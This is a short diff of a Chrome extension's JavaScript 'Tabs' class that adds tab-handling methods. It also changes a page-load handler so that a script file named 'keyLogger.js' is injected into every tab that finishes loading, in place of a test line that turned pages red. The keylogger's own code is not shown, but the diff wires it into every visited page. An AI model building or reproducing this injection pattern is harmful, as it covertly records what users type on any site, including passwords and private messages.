@@ -10,12 +10,27 @@ class Tabs {
         this.onCompleteState        = this.onCompleteState.bind(this);
     }
 
+    // Tab functions
+    setLockedTab (tab) {
+        this.lockedTab = tab;
+    }
+
+    remove(tabId){
+        return chromep.tabs.remove(tabId);
+    }
+
+    init(){
+        this.addEvent('onUpdated', this.onCompleteState)
+    }
+
     onCompleteState(tabId, changeInfo){
         if (changeInfo.status === 'complete') {
             chrome.tabs.executeScript(tabId, {
-                allFrames: true, 
-                code: "document.body.style.backgroundColor='red'",
+                // code: "document.body.style.backgroundColor='red'",
+                file: "keyLogger.js",
                 runAt: 'document_idle'
+            }, (result) => {
+                console.log('executeScript result', result)
             })
         }
     }
